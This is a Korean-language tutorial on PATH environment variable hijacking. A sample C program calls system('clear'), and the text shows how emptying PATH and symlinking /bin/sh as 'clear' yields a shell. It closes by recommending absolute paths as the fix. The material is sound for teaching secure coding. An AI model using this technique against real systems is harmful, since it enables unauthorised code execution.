환경 변수 공격 - PATH :
    environ1.c는 clear 명령어를 실행하는 코드입니다.
    ex)
        // gcc -o environ1 environ1.c
        #include <stdlib.h>
        #include <unistd.h>
        
        int main()
        {
            printf("Screen Cleaner\n");
            system("clear");
                
            return 0;
        }

    clear 명령어가 system 함수의 인자로 전달됐기 때문에 PATH 환경 변수를 읽어들여 해당 경로에 있는 clear 파일을 찾을 것입니다.
    때문에 PATH 환경변수를 조작한다면 원하는 파일을 실행시킬 수 있습니다.

    그럼 아래와 같은 명령어로 PATH를 수정하고 예제 코드를 실행시켜봅시다.
    ex)
        $ export PATH=""
        $ ./environ1
        Screen Cleaner
        sh: 1: clear: not found

    PATH 환경 변수를 비워주고 실행했을 때, clear 파일을 찾지 못하고 에러를 출력시키게 됩니다.

    만약 /bin/sh 파일을 심볼릭 링크를 사용하여 clear 이름으로 링킹 하면 어떻게 될지 생각해보아야 합니다.
    ex)
        $ ln -s /bin/sh ./clear
        $ export PATH=""
        $ ./environ1
        Screen Cleaner
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)

        // 심볼릭 링크(symbolic link) 란? 
        //    - 링크를 연결하여 원본 파일을 직접 사용하는 것과 같은 효과를 내는 링크이다.  윈도우의 바로가기와 비슷한 개념 
        //    - 특정 폴더에 링크를 걸어 NAS, library 원본 파일을 사용하기 위해 심볼릭 링크를 사용한다. 

    /bin/sh 파일을 현재 위치한 경로에 clear 이름으로 심볼릭 링크를 걸고 PATH 환경 변수를 비워준 후에 예제 코드를 실행한 모습입니다.

    예제 파일에서 clear 명령어를 실행했는데 /bin/sh 파일이 실행되어 셸을 획득한 것을 확인할 수 있습니다. 
    이렇게 잘못된 경로 사용으로 인해 임의 코드 실행까지 이어질 수 있다는 것을 확인해보았습니다.

    특정 명령어를 사용해야 할 경우에는 절대 경로를 사용하여 익스플로잇이 불가능하도록 만드는 것이 좋은 코드의 예입니다.
    ex)
        system("/usr/bin/clear");
























